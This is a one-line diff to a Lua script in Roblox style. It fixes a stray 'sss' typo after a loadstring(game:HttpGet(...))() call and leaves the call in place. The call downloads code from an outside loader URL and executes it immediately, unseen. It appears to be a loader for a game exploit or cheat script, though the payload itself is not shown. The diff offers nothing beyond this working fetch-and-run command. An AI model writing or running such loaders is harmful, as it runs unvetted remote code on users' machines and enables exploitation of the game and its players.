@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.luasec.org/loader/0cd309dd86c1"))()sss
+loadstring(game:HttpGet("https://api.luasec.org/loader/0cd309dd86c1"))()
